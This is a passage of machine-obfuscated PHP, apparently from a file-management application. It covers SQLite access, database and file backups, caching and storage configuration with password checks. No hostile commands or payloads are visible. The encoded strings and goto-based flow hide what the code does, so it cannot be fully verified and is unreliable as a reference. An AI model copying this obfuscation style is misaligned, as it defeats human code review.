$–ŒÍçÔÒ[$ÀÕØÑ‚ú[$íõŸÕ˜[32]]] = array($íõŸÕ˜[32] => $ÀÕØÑ‚ú[$íõŸÕ˜[32]], $íõŸÕ˜[33] => $ÀÕØÑ‚ú[$íõŸÕ˜[33]], $íõŸÕ˜[35] => (bool) ($ÀÕØÑ‚ú[$íõŸÕ˜[35]] === $íõŸÕ˜[12]), $íõŸÕ˜[37] => $ÀÕØÑ‚ú[$íõŸÕ˜[56]], $íõŸÕ˜[39] => (bool) $ÀÕØÑ‚ú[$íõŸÕ˜[57]], $íõŸÕ˜[42] => (bool) $ÀÕØÑ‚ú[$íõŸÕ˜[57]]); } } return $–ŒÍçÔÒ; } public function getTables($¢¤ÃÊÔñ = '') { $å½åæ…± =& $_SERVER[§Êá¸İ]; $‚À¡ëÒÃ = $this->query($å½åæ…±[45] . $å½åæ…±[46] . $å½åæ…±[47]); $†êËâÌ = array(); foreach ($‚À¡ëÒÃ as $¶İ©½è× => $÷ºµûïÙ) { $†êËâÌ[$¶İ©½è×] = current($÷ºµûïÙ); } return $†êËâÌ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¹¡®²ñó =& $_SERVER[§Êá¸İ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¹¡®²ñó[12] != $this->queryStr) { $this->error .= LNG($¹¡®²ñó[48]) . $this->queryStr; } think_trace($this->error, $¹¡®²ñó[12], $¹¡®²ñó[49]); return $this->error; } public function escapeString($¢©îÎ) { $Ÿº€ßÑŞ =& $_SERVER[§Êá¸İ]; if ($this->_linkID) { return $this->_linkID->escapeString($¢©îÎ); } return str_ireplace($Ÿº€ßÑŞ[58], $Ÿº€ßÑŞ[59], $¢©îÎ); } public function parseLimit($İî†¿à) { $¬ÆÑ¥ÎŒ =& $_SERVER[§Êá¸İ]; $›Ÿ‹âÜ­ = $¬ÆÑ¥ÎŒ[12]; if (!empty($İî†¿à)) { $İî†¿à = explode($¬ÆÑ¥ÎŒ[50], $İî†¿à); if (count($İî†¿à) > 1) { $›Ÿ‹âÜ­ .= $¬ÆÑ¥ÎŒ[51] . $İî†¿à[1] . $¬ÆÑ¥ÎŒ[52] . $İî†¿à[0] . $¬ÆÑ¥ÎŒ[53]; } else { $›Ÿ‹âÜ­ .= $¬ÆÑ¥ÎŒ[51] . $İî†¿à[0] . $¬ÆÑ¥ÎŒ[53]; } } return $›Ÿ‹âÜ­; } } goto cöÊï«Ï‡‹; BºâµÊÇÚò: class BackupDbFile { public function __construct() { } public function index() { $É…Êå— =& $_SERVER[§Êá¸İ]; $‚³§”“ = Backup::get(); $ÅÛøÂ´Ÿ = $‚³§”“[$É…Êå—[32]]; $‘±õŒéó = $this->tmpFilesPath() . "\142\141\x63\153\x75\x70\x5f{$ÅÛøÂ´Ÿ}\x2f"; $¶­Âæè± = $this->backupPath($‚³§”“); if (!($¶­Âæè± = IO::mkdir($¶­Âæè±))) { return !1; } $Úö‹ş‘¾ = IO::listPath($‘±õŒéó); $»ÙÍ°¨£ = isset($Úö‹ş‘¾[$É…Êå—[86]]) ? $Úö‹ş‘¾[$É…Êå—[86]] : array(); $áÎÎÃ¥Æ = array_sum(array_column($»ÙÍ°¨£, $É…Êå—[79])); if (!$áÎÎÃ¥Æ) { return !1; } $¼˜Æß‚Ô = array($É…Êå—[885] => $áÎÎÃ¥Æ, $É…Êå—[886] => time()); Backup::set($¼˜Æß‚Ô); $­Áœô†Ÿ = new TaskFileTransfer($É…Êå—[887], $É…Êå—[870], count($»ÙÍ°¨£), LNG($É…Êå—[871]) . $É…Êå—[462] . LNG($É…Êå—[873]) . $É…Êå—[888]); $­Áœô†Ÿ->task[$É…Êå—[850]] = $áÎÎÃ¥Æ; foreach ($Úö‹ş‘¾[$É…Êå—[86]] as $öö§ğËƒ) { $¬ó¾ÎÚØ = IO::move($öö§ğËƒ[$É…Êå—[87]], $¶­Âæè±); if (!$¬ó¾ÎÚØ) { $­Áœô†Ÿ->end(); $‰åÚ°ó× = IO::getLastError($É…Êå—[889] . $öö§ğËƒ[$É…Êå—[87]] . $É…Êå—[890] . $¶­Âæè± . $É…Êå—[178]); write_log($‰åÚ°ó×, $É…Êå—[870]); return !1; } } $˜éŒÈĞ = new DbManage(); $ş¾Ï‰şÕ = $˜éŒÈĞ->getSqlFile(); if (!$ş¾Ï‰şÕ[$É…Êå—[891]] || !$ş¾Ï‰şÕ[$É…Êå—[13]]) { return !1; } IO::move($ş¾Ï‰şÕ[$É…Êå—[891]], $¶­Âæè±); IO::move($ş¾Ï‰şÕ[$É…Êå—[13]], $¶­Âæè±); $­Áœô†Ÿ->end(); $¼˜Æß‚Ô = array($É…Êå—[892] => $áÎÎÃ¥Æ, $É…Êå—[893] => time()); Backup::set($¼˜Æß‚Ô); return !0; } private function backupPath($ö‘ºƒùç) { $¸ÁËãé‹ =& $_SERVER[§Êá¸İ]; $ìÃ×¾Ø“ = $ö‘ºƒùç[$¸ÁËãé‹[32]]; $£·«±¸Á = Model($¸ÁËãé‹[857])->get($¸ÁËãé‹[858]); $²©ÃœÅ = substr(md5($¸ÁËãé‹[859] . $£·«±¸Á . $ìÃ×¾Ø“), 0, 8); return "\x7b\x69\x6f\72{$ö‘ºƒùç[$¸ÁËãé‹[839]]}\175\x2f\x64\141\164\x61\x62\x61\163\x65\57\142\x61\143\153\x75\160\57" . $ìÃ×¾Ø“ . $¸ÁËãé‹[11] . $²©ÃœÅ; } private function tmpFilesPath() { $áÛÉÍ›’ =& $_SERVER[§Êá¸İ]; $ÌÇ—ó‰¾ = TEMP_FILES; if ($GLOBALS[$áÛÉÍ›’[6]][$áÛÉÍ›’[92]][$áÛÉÍ›’[883]]) { $ÌÇ—ó‰¾ = $GLOBALS[$áÛÉÍ›’[6]][$áÛÉÍ›’[92]][$áÛÉÍ›’[883]]; if (!mk_dir($ÌÇ—ó‰¾) || !is_writable($ÌÇ—ó‰¾) || !IO::mkfile($ÌÇ—ó‰¾ . $áÛÉÍ›’[884])) { $ÌÇ—ó‰¾ = TEMP_FILES; } } return $ÌÇ—ó‰¾; } } class BackupFile { public function __construct() { } public function index() { $ß©¢¾ü‹ = Backup::get(); $òËÔò = $ß©¢¾ü‹[$_SERVER[§Êá¸İ][369]][$_SERVER[§Êá¸İ][230]][$_SERVER[§Êá¸İ][549]]; $àÔóÛ³â = array($_SERVER[§Êá¸İ][550] => array($_SERVER[§Êá¸İ][894], $òËÔò), $_SERVER[§Êá¸İ][895] => array($_SERVER[§Êá¸İ][407], $ß©¢¾ü‹[$_SERVER[§Êá¸İ][839]])); $‡˜óšÌ“ = (int) Model($_SERVER[§Êá¸İ][876])->where($àÔóÛ³â)->count($_SERVER[§Êá¸İ][549]); $—Ëíë˜• = (int) Model($_SERVER[§Êá¸İ][876])->where($àÔóÛ³â)->sum($_SERVER[§Êá¸İ][79]); $Ö¥¢ö§ = new TaskFileTransfer($_SERVER[§Êá¸İ][896], $_SERVER[§Êá¸İ][870], $‡˜óšÌ“, LNG($_SERVER[§Êá¸İ][871]) . $_SERVER[§Êá¸İ][872] . LNG($_SERVER[§Êá¸İ][897])); $Ö¥¢ö§->task[$_SERVER[§Êá¸İ][850]] = $—Ëíë˜•; $è€¾³é = array($_SERVER[§Êá¸İ][898] => $‡˜óšÌ“, $_SERVER[§Êá¸İ][899] => $—Ëíë˜•, $_SERVER[§Êá¸İ][900] => time()); Backup::set($è€¾³é); $ÄøÙØÊû = !0; $è¿Ççœ« = $this->storeIds(); $Ï·…Êí = 1; $”Ê´‹„Ÿ = 1000; $À‘áÃç¾ = $ÑâÑ‘Êç = 0; $îÔĞƒè´ = array(); $‰ÉÉ´®Ğ = $ÄûÉ±’ = 0; do { $†óæÁ›š = $_SERVER[§Êá¸İ][901]; $Å÷„Î‘² = Model($_SERVER[§Êá¸İ][876])->where($àÔóÛ³â)->field($†óæÁ›š)->order($_SERVER[§Êá¸İ][902])->selectPage($”Ê´‹„Ÿ, $Ï·…Êí); $ü‹ã€Å» = !empty($Å÷„Î‘²[$_SERVER[§Êá¸İ][445]]) ? $Å÷„Î‘²[$_SERVER[§Êá¸İ][445]] : array(); foreach ($ü‹ã€Å» as $öÒ´ºº) { if (!$this->_fileExist($öÒ´ºº, $îÔĞƒè´, $è¿Ççœ«)) { write_log("\x66\151\154\x65\x20\156\157\164\40\145\x78\151\x73\x74\x2e\146\151\x6c\145\x49\x44\72{$öÒ´ºº[$_SERVER[§Êá¸İ][549]]}\x2c\x20\160\141\x74\x68\72{$öÒ´ºº[$_SERVER[§Êá¸İ][87]]}", $_SERVER[§Êá¸İ][903]); continue; } $ğ£ÒÖ÷œ = $öÒ´ºº[$_SERVER[§Êá¸İ][87]]; $—…Ğñ¢ã = "\173\x69\157\x3a{$ß©¢¾ü‹[$_SERVER[§Êá¸İ][839]]}\175" . substr($ğ£ÒÖ÷œ, strlen("\x7b\151\x6f\x3a{$öÒ´ºº[$_SERVER[§Êá¸İ][904]]}\x7d")); if (IO::exist($—…Ğñ¢ã)) { $Ö¥¢ö§->updateFileEnd($öÒ´ºº[$_SERVER[§Êá¸İ][32]], $öÒ´ºº[$_SERVER[§Êá¸İ][79]]); } else { $—…Ğñ¢ã = get_path_father($—…Ğñ¢ã); IO::mkdir($—…Ğñ¢ã); if (!IO::copy($ğ£ÒÖ÷œ, $—…Ğñ¢ã, $_SERVER[§Êá¸İ][905])) { write_log($_SERVER[§Êá¸İ][906] . $ğ£ÒÖ÷œ . $_SERVER[§Êá¸İ][890] . $—…Ğñ¢ã . $_SERVER[§Êá¸İ][178], $_SERVER[§Êá¸İ][870]); $ÄøÙØÊû = !1; break; } } $òËÔò = $öÒ´ºº[$_SERVER[§Êá¸İ][549]]; $ÑâÑ‘Êç += 1; $À‘áÃç¾ += $öÒ´ºº[$_SERVER[§Êá¸İ][79]]; $ÄûÉ±’ += 1; $‰ÉÉ´®Ğ += $öÒ´ºº[$_SERVER[§Êá¸İ][79]]; if ($À‘áÃç¾ >= 1024 * 1024 * 100) { $è€¾³é = array($_SERVER[§Êá¸İ][838] => $òËÔò, $_SERVER[§Êá¸İ][907] => $ÄûÉ±’, $_SERVER[§Êá¸İ][908] => $‰ÉÉ´®Ğ); Backup::set($è€¾³é); $À‘áÃç¾ = $ÑâÑ‘Êç = 0; } } $¯Éñ¥íö = count($ü‹ã€Å»); $Ï·…Êí++; } while ($¯Éñ¥íö == $”Ê´‹„Ÿ); $Ö¥¢ö§->end(); $è€¾³é = array($_SERVER[§Êá¸İ][909] => 1, $_SERVER[§Êá¸İ][848] => time(), $_SERVER[§Êá¸İ][862] => 1, $_SERVER[§Êá¸İ][838] => $òËÔò, $_SERVER[§Êá¸İ][910] => time()); if ($ÑâÑ‘Êç) { $è€¾³é[$_SERVER[§Êá¸İ][907]] = $ÄûÉ±’; $è€¾³é[$_SERVER[§Êá¸İ][908]] = $‰ÉÉ´®Ğ; } Backup::set($è€¾³é); return !0; } private function _fileExist($¶“ê¬„¦, &$›èÃŸÔ, $×Ë·æõª) { $Œœ®ñ‡Ô =& $_SERVER[§Êá¸İ]; $ü–³š = $¶“ê¬„¦[$Œœ®ñ‡Ô[87]]; if (in_array($¶“ê¬„¦[$Œœ®ñ‡Ô[549]], $›èÃŸÔ)) { return !1; } if (!in_array($¶“ê¬„¦[$Œœ®ñ‡Ô[904]], $×Ë·æõª)) { return !1; } if (IO::exist($ü–³š)) { return !0; } $˜¥¼ö¸ = get_path_father($ü–³š); if (IO::exist($˜¥¼ö¸)) { $›èÃŸÔ[] = $¶“ê¬„¦[$Œœ®ñ‡Ô[549]]; return !1; } $ôœ•Éä = array($Œœ®ñ‡Ô[904] => $¶“ê¬„¦[$Œœ®ñ‡Ô[904]], $Œœ®ñ‡Ô[87] => array($Œœ®ñ‡Ô[459], "{$˜¥¼ö¸}\45")); $Ûƒ…–È­ = Model($Œœ®ñ‡Ô[876])->where($ôœ•Éä)->field($Œœ®ñ‡Ô[550])->select(); $›èÃŸÔ = array_merge($›èÃŸÔ, array_to_keyvalue($Ûƒ…–È­, $Œœ®ñ‡Ô[12], $Œœ®ñ‡Ô[549])); return !1; } private function _fileFilter($˜ğ´½ á) { $Õ‘¥èÁ­ =& $_SERVER[§Êá¸İ]; return; if (empty($˜ğ´½ á)) { return; } $½«§Û¸´ = array($Õ‘¥èÁ­[549] => array($Õ‘¥èÁ­[7], array_unique($˜ğ´½ á))); $«ÌäÊÎÀ = Model($Õ‘¥èÁ­[911])->where($½«§Û¸´)->field($Õ‘¥èÁ­[193])->select(); foreach ($«ÌäÊÎÀ as $Ì°¼ÑÁ‰) { Model($Õ‘¥èÁ­[911])->remove($Ì°¼ÑÁ‰[$Õ‘¥èÁ­[193]], !1); } } private function storeIds() { $ÄíÓú¥ =& $_SERVER[§Êá¸İ]; $Á©ÊÙ½ = Model($ÄíÓú¥[854])->listData(); $²†ÌÉ ì = array(); $¨³İ¨ Ù = $GLOBALS[$ÄíÓú¥[6]][$ÄíÓú¥[92]][$ÄíÓú¥[912]]; foreach ($Á©ÊÙ½ as $Öê»ÔëË) { $ä¡¡Í®¬ = strtolower($Öê»ÔëË[$ÄíÓú¥[98]]); if (!isset($¨³İ¨ Ù[$ä¡¡Í®¬])) { continue; } $¡ö½Ö×Ø = $ÄíÓú¥[77] . (isset($¨³İ¨ Ù[$ä¡¡Í®¬]) ? $¨³İ¨ Ù[$ä¡¡Í®¬] : ucfirst($ä¡¡Í®¬)); if (!class_exists($¡ö½Ö×Ø)) { continue; } $²†ÌÉ ì[] = $Öê»ÔëË[$ÄíÓú¥[483]]; } return $²†ÌÉ ì; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¸õì°¶‚ =& $_SERVER[§Êá¸İ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $œÜ­ëÜª = $GLOBALS[$¸õì°¶‚[6]][$¸õì°¶‚[425]]; $Æƒ“½¬Ä = $œÜ­ëÜª[$œÜ­ëÜª[$¸õì°¶‚[913]]]; $àÅÂ£ù½ = $œÜ­ëÜª[$¸õì°¶‚[914]]; switch ($œÜ­ëÜª[$¸õì°¶‚[913]]) { case $¸õì°¶‚[21]: self::$handle = Model($¸õì°¶‚[915]); break; case $¸õì°¶‚[916]: self::$handle = new CacheRedis($Æƒ“½¬Ä, $àÅÂ£ù½); break; case $¸õì°¶‚[917]: self::$handle = new CacheMemcached($Æƒ“½¬Ä, $àÅÂ£ù½); break; case $¸õì°¶‚[230]: self::$handle = new CacheFile($Æƒ“½¬Ä, $àÅÂ£ù½); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($à¤¡Ûü) { if (is_array($à¤¡Ûü) || is_object($à¤¡Ûü)) { $à¤¡Ûü = json_encode($à¤¡Ûü); } $à¤¡Ûü = rawurlencode($à¤¡Ûü); return md5(KOD_SITE_ID . $_SERVER[§Êá¸İ][11] . $à¤¡Ûü); } public static function get($ŞÄóÈŒ•, $ËÓçÁŒ¼ = false) { $¦¸ú„Ì¸ = self::key($ŞÄóÈŒ•); $ùŸÅîÚ = self::init(); if ($ËÓçÁŒ¼) { return unserialize($ùŸÅîÚ->get($¦¸ú„Ì¸)); } if (!isset(self::$memoryCache[$¦¸ú„Ì¸])) { $Áèãƒ™¹ = $ùŸÅîÚ->get($¦¸ú„Ì¸); self::$memoryCache[$¦¸ú„Ì¸] = unserialize($Áèãƒ™¹); } return self::$memoryCache[$¦¸ú„Ì¸]; } public static function set($óÛ¢Ï«õ, $Ş›èÑÌ, $¼Èİ¶ = false) { $Ù£š¼¯ğ =& $_SERVER[§Êá¸İ]; $Ë¬Ö°ÃŒ = self::key($óÛ¢Ï«õ); if (isset(self::$memoryCache[$Ë¬Ö°ÃŒ]) && self::$memoryCache[$Ë¬Ö°ÃŒ] === $Ş›èÑÌ) { return !0; } if ($¼Èİ¶ === 0) { self::$memoryCache[$Ë¬Ö°ÃŒ] = $Ş›èÑÌ; return !0; } $ğë–ş©‚ = self::init(); $Ûñ™£µÄ = serialize($Ş›èÑÌ); CacheLock::lock($óÛ¢Ï«õ . $Ù£š¼¯ğ[918]); $…•‚‚ã÷ = $ğë–ş©‚->set($Ë¬Ö°ÃŒ, $Ûñ™£µÄ, $¼Èİ¶); self::$memoryCache[$Ë¬Ö°ÃŒ] = $Ş›èÑÌ; CacheLock::unlock($óÛ¢Ï«õ . $Ù£š¼¯ğ[918]); return $…•‚‚ã÷; } public static function getCall($á„‰ìÂ°, $¨ù„±èÆ, $ ›êÌ˜, $£ØËÙ«Û = array()) { $„÷˜´øğ =& $_SERVER[§Êá¸İ]; $Éó–ÓèÕ = self::get($á„‰ìÂ°); if ($Éó–ÓèÕ || $Éó–ÓèÕ === $„÷˜´øğ[12]) { return $Éó–ÓèÕ; } $Éó–ÓèÕ = call_user_func_array($ ›êÌ˜, $£ØËÙ«Û); $Éó–ÓèÕ = $Éó–ÓèÕ ? $Éó–ÓèÕ : $„÷˜´øğ[12]; self::set($á„‰ìÂ°, $Éó–ÓèÕ, $¨ù„±èÆ); return $Éó–ÓèÕ; } public static function remove($Ó°¹¶) { $†´¶ËÛç = self::key($Ó°¹¶); unset(self::$memoryCache[$†´¶ËÛç]); self::clearTimeout(); CacheLock::lock($Ó°¹¶); $ŒÊ‹¬å  = self::init()->remove($†´¶ËÛç); CacheLock::unlock($Ó°¹¶); return $ŒÊ‹¬å ; } public static function removeMemory($«Ğ±¦ú) { $ªçµŸ·É = self::key($«Ğ±¦ú); unset(self::$memoryCache[$ªçµŸ·É]); } public static function clearMemory($ÇÛ¾†´ = false) { if ($ÇÛ¾†´) { $ÇÛ¾†´ = self::key($ÇÛ¾†´); unset(self::$memoryCache[$ÇÛ¾†´]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[§Êá¸İ][919])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[§Êá¸İ][920])) { self::init()->clearTimeout(); } } } goto AœÍ©å”†Â; A×Ï™ÅéÉ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x73\x6f\x75\162\143\x65\x53\145\x63\162\145\164\x4c\x69\163\x74"; public $field = array("\x73\157\165\162\143\x65\111\x44", "\164\x79\x70\x65\111\x44", "\143\x72\x65\x61\x74\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x73\x74\x6f\x72\141\147\145\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\163\x69\x7a\x65\115\x61\170", "\x73\x79\163\164\x65\155", "\144\145\146\141\165\x6c\164", "\144\162\x69\166\145\162", "\143\x6f\156\146\x69\x67"); public function listData($À†Ç¢ä = false, $»ÆÜ„µ = "\155\x6f\144\151\146\171\x54\x69\155\x65", $å¡ÂÕ–Ì = false) { $Ù÷«Ç¢€ =& $_SERVER[§Êá¸İ]; $£·†“ğï = parent::listData($À†Ç¢ä, $»ÆÜ„µ, $å¡ÂÕ–Ì); if ($À†Ç¢ä) { return $£·†“ğï; } $ú„ˆ¼¬ = array(); if ($GLOBALS[$Ù÷«Ç¢€[2304]]) { $ú„ˆ¼¬ = $this->ioSizeUseGet(array_to_keyvalue($£·†“ğï, $Ù÷«Ç¢€[12], $Ù÷«Ç¢€[483])); } foreach ($£·†“ğï as $È›¦´®¿ => $áóŠì–µ) { unset($£·†“ğï[$È›¦´®¿][$Ù÷«Ç¢€[6]]); $£·†“ğï[$È›¦´®¿][$Ù÷«Ç¢€[1966]] = isset($ú„ˆ¼¬[$áóŠì–µ[$Ù÷«Ç¢€[483]]]) ? $ú„ˆ¼¬[$áóŠì–µ[$Ù÷«Ç¢€[483]]] : 0; } return $£·†“ğï; } public function ioSizeUseGet($“²ßş•) { $ãîÇéŠÌ =& $_SERVER[§Êá¸İ]; if (!$“²ßş•) { return array(); } $é®‘¶Ô = $ãîÇéŠÌ[2305] . implode($ãîÇéŠÌ[50], $“²ßş•); $¸áë£øÊ = Cache::get($é®‘¶Ô); if ($¸áë£øÊ) { return $¸áë£øÊ; } $ò¿ü›·› = array($ãîÇéŠÌ[904] => $ãîÇéŠÌ[483], $ãîÇéŠÌ[2306] => $ãîÇéŠÌ[79]); $ûŒ‹À²Ã = array($ãîÇéŠÌ[904] => array($ãîÇéŠÌ[7], $“²ßş•)); $¸áë£øÊ = Model($ãîÇéŠÌ[876])->field($ò¿ü›·›)->where($ûŒ‹À²Ã)->group($ãîÇéŠÌ[904])->select(); $¸áë£øÊ = array_to_keyvalue($¸áë£øÊ, $ãîÇéŠÌ[483], $ãîÇéŠÌ[79]); Cache::set($é®‘¶Ô, $¸áë£øÊ, 600); return $¸áë£øÊ; } public function getConfig($®ì¦µ¥Œ) { $Æ…Á¸ï = parent::listData($®ì¦µ¥Œ); return json_decode($Æ…Á¸ï[$_SERVER[§Êá¸İ][6]], !0); } public function update($ºÍ’ªÓ•, $Ùİíëæ) { $‘æ×‰éı =& $_SERVER[§Êá¸İ]; $™„¦íøÍ = $Ùİíëæ[$‘æ×‰éı[32]]; $îÒô¨¬ƒ = array_to_keyvalue(parent::listData(), $‘æ×‰éı[32]); if (isset($îÒô¨¬ƒ[$™„¦íøÍ]) && $îÒô¨¬ƒ[$™„¦íøÍ][$‘æ×‰éı[483]] != $ºÍ’ªÓ•) { return !1; } $this->checkPwd($ºÍ’ªÓ•, $Ùİíëæ); if (isset($Ùİíëæ[$‘æ×‰éı[2307]]) && $Ùİíëæ[$‘æ×‰éı[2307]] == $‘æ×‰éı[91]) { $this->checkConfig($Ùİíëæ); } unset($Ùİíëæ[$‘æ×‰éı[2307]]); $ÓÅÃşªú = parent::update($ºÍ’ªÓ•, $Ùİíëæ); if ($ÓÅÃşªú && $Ùİíëæ[$‘æ×‰éı[37]]) { $™Ê¤É©˜ = 0; foreach ($îÒô¨¬ƒ as $’Ô¾ÎÜé) { if ($’Ô¾ÎÜé[$‘æ×‰éı[37]] && $’Ô¾ÎÜé[$‘æ×‰éı[483]] != $ºÍ’ªÓ•) { $™Ê¤É©˜ = $’Ô¾ÎÜé[$‘æ×‰éı[483]]; parent::update($’Ô¾ÎÜé[$‘æ×‰éı[483]], array($‘æ×‰éı[37] => 0)); } } $this->updateBackup($ºÍ’ªÓ•, $™Ê¤É©˜); } return $ÓÅÃşªú; } public function add($ÌÇ¬Ì¾Ö) { $¦Éê·–¹ =& $_SERVER[§Êá¸İ]; $ óŸ»œ· = array_to_keyvalue(parent::listData(), $¦Éê·–¹[32]); if (isset($ óŸ»œ·[$ÌÇ¬Ì¾Ö[$¦Éê·–¹[32]]])) { return !1; } $this->checkConfig($ÌÇ¬Ì¾Ö); $Ãå‘óĞ = parent::insert($ÌÇ¬Ì¾Ö); if ($Ãå‘óĞ && $ÌÇ¬Ì¾Ö[$¦Éê·–¹[37]]) { foreach ($ óŸ»œ· as $›ĞÛí¬Á) { if ($›ĞÛí¬Á[$¦Éê·–¹[37]]) { parent::update($›ĞÛí¬Á[$¦Éê·–¹[483]], array($¦Éê·–¹[37] => 0)); } } } return $Ãå‘óĞ; } public function updateBackup($ŠäÃêßâ, $¥Á¬·©€) { $ìä‹±µĞ =& $_SERVER[§Êá¸İ]; if (!$¥Á¬·©€) { return; } $Ğßî¢”‘ = Model($ìä‹±µĞ[835])->config(); if ($Ğßî¢”‘[$ìä‹±µĞ[1749]] != $ìä‹±µĞ[91] || $Ğßî¢”‘[$ìä‹±µĞ[839]] != $¥Á¬·©€) { return; } $ÑŞ˜ûš¹ = Model($ìä‹±µĞ[857])->get($ìä‹±µĞ[870]); $ÑŞ˜ûš¹ = json_decode($ÑŞ˜ûš¹, !0); if (!$ÑŞ˜ûš¹) { return; } $ÑŞ˜ûš¹[$ìä‹±µĞ[839]] = $ŠäÃêßâ; Model($ìä‹±µĞ[857])->set(array($ìä‹±µĞ[870] => $ÑŞ˜ûš¹)); } public function checkPwd($ªÁ·É»», &$¿áÚœå) { $›í®ÃÙÍ =& $_SERVER[§Êá¸İ]; if (empty($¿áÚœå[$›í®ÃÙÍ[6]])) { return; } $Ö˜Ó‹È² = json_decode($¿áÚœå[$›í®ÃÙÍ[6]], !0); $ßŸÅâ¶Ù = $›í®ÃÙÍ[12]; $³òÂáÊ² = array($›í®ÃÙÍ[2308], $›í®ÃÙÍ[2309], $›í®ÃÙÍ[976]); foreach ($³òÂáÊ² as $ôÂ¿œÃæ) { if (isset($Ö˜Ó‹È²[$ôÂ¿œÃæ])) { $ßŸÅâ¶Ù = $ôÂ¿œÃæ; break; } } if (!$ßŸÅâ¶Ù) { return; } $Øş«ºƒ” = $this->getConfig($ªÁ·É»»); $‡›ŒÅÕê = $Øş«ºƒ”[$ßŸÅâ¶Ù]; $×üá™Í³ = $Ö˜Ó‹È²[$ßŸÅâ¶Ù]; if ($×üá™Í³ == str_repeat($›í®ÃÙÍ[220], strlen($‡›ŒÅÕê))) { $Ö˜Ó‹È²[$ßŸÅâ¶Ù] = $‡›ŒÅÕê; $¿áÚœå[$›í®ÃÙÍ[6]] = json_encode($Ö˜Ó‹È²); } else { if ($×üá™Í³ != $‡›ŒÅÕê) { $¿áÚœå[$›í®ÃÙÍ[2307]] = $›í®ÃÙÍ[91]; } } } public function checkConfig(&$ªê“Áâİ, $àÃ±Âı‚ = false) { $Ö´ñëÆ =& $_SERVER[§Êá¸İ]; $ßÌ´ƒ¡€ = strtolower($ªê“Áâİ[$Ö´ñëÆ[98]]); $Ø³¡èÒ¶ = json_decode($ªê“Áâİ[$Ö´ñëÆ[6]], !0); foreach ($Ø³¡èÒ¶ as $ñœû => $®ÈÂùˆ²) { if (is_string($®ÈÂùˆ²)) { $Ø³¡èÒ¶[$ñœû] = trim($®ÈÂùˆ²); } } $Ø³¡èÒ¶[$Ö´ñëÆ[2310]] = rand_string(6); $›ğù¼ = $GLOBALS[$Ö´ñëÆ[6]][$Ö´ñëÆ[92]][$Ö´ñëÆ[912]]; $·ÚÚŒ‰÷ = isset($›ğù¼[$ßÌ´ƒ¡€]) ? $›ğù¼[$ßÌ´ƒ¡€] : ucfirst($ßÌ´ƒ¡€); $ªøÙµºÆ = $Ö´ñëÆ[77] . $·ÚÚŒ‰÷; if (!$·ÚÚŒ‰÷ || !class_exists($ªøÙµºÆ)) { if ($àÃ±Âı‚) { return LNG($Ö´ñëÆ[2311]); } write_log(array($Ö´ñëÆ[2312], $ªê“Áâİ, get_caller_info()), $Ö´ñëÆ[215]); show_json(LNG($Ö´ñëÆ[2311]), !1, $ªê“Áâİ); } $ÙÊŸ©ÑÃ = new $ªøÙµºÆ($Ø³¡èÒ¶); if (in_array($ßÌ´ƒ¡€, $ÙÊŸ©ÑÃ->objectDriver)) { try { if (!$ÙÊŸ©ÑÃ->isBucketCors() && !$ÙÊŸ©ÑÃ->setBucketCors()) { $…ßëïÀ½ = LNG($Ö´ñëÆ[2313]); $…ßëïÀ½ .= $Ö´ñëÆ[2314] . LNG($Ö´ñëÆ[2315]); } } catch (Exception $´±ÀÂ«˜) { $…ßëïÀ½ = $´±ÀÂ«˜->getMessage(); } if (isset($…ßëïÀ½)) { return $this->_parseError($…ßëïÀ½, $ßÌ´ƒ¡€, $àÃ±Âı‚); } if ($ßÌ´ƒ¡€ == $Ö´ñëÆ[68] && !$ÙÊŸ©ÑÃ->checkRegion()) { return $this->_parseError(LNG($Ö´ñëÆ[2316]), $ßÌ´ƒ¡€, $àÃ±Âı‚); } } $ßúî’›‰ = rtrim($Ø³¡èÒ¶[$Ö´ñëÆ[1272]], $Ö´ñëÆ[8]) . $Ö´ñëÆ[8]; $ößıÏğ = $ÙÊŸ©ÑÃ->getPath($ßúî’›‰ . $Ö´ñëÆ[1276]); try { if ($ßÌ´ƒ¡€ == $Ö´ñëÆ[109]) { $ÙÊŸ©ÑÃ->mkdir($ßúî’›‰); } $Ç‹şÇ´Ä = $ÙÊŸ©ÑÃ->mkfile($ößıÏğ); if (!$Ç‹şÇ´Ä) { $…ßëïÀ½ = LNG($Ö´ñëÆ[2313]); } } catch (Exception $´±ÀÂ«˜) { $…ßëïÀ½ = $´±ÀÂ«˜->getMessage(); } if (isset($…ßëïÀ½)) { return $this->_parseError($…ßëïÀ½, $ßÌ´ƒ¡€, $àÃ±Âı‚); } $Ø³¡èÒ¶[$Ö´ñëÆ[1272]] = $ßúî’›‰; $ªê“Áâİ[$Ö´ñëÆ[6]] = json_encode($Ø³¡èÒ¶); $ªê“Áâİ[$Ö´ñëÆ[98]] = $·ÚÚŒ‰÷; return !0; } private function _parseError($éÃÏÕã›, $Âüš“¤, $«ø€êï  = false) { $óèºãß =& $_SERVER[§Êá¸İ]; if ($Âüš“¤ == $óèºãß[68] && stripos($éÃÏÕã›, $óèºãß[2317])) { $•ô€ÃŸ = explode($óèºãß[10], $éÃÏÕã›); $½ã¬¯Éû = isset($•ô€ÃŸ[1]) ? $•ô€ÃŸ[1] : $óèºãß[12]; $û—÷ü¼ = array($óèºãß[2318] => LNG($óèºãß[2319]), $óèºãß[2320] => LNG($óèºãß[2321])); if (isset($û—÷ü¼[$½ã¬¯Éû])) { $éÃÏÕã› = $û—÷ü¼[$½ã¬¯Éû]; } } if (stripos($éÃÏÕã›, $óèºãß[2322]) === 0) { $íÌ™âø = strpos($éÃÏÕã›, $óèºãß[178]); if ($íÌ™âø === !1) { $íÌ™âø = strpos($éÃÏÕã›, $óèºãß[4]); } if ($íÌ™âø !== !1) { $éÃÏÕã› = substr($éÃÏÕã›, $íÌ™âø + 1); } } $éÃÏÕã› = LNG($óèºãß[1279]) . $éÃÏÕã›; if ($«ø€êï ) { return $éÃÏÕã›; } 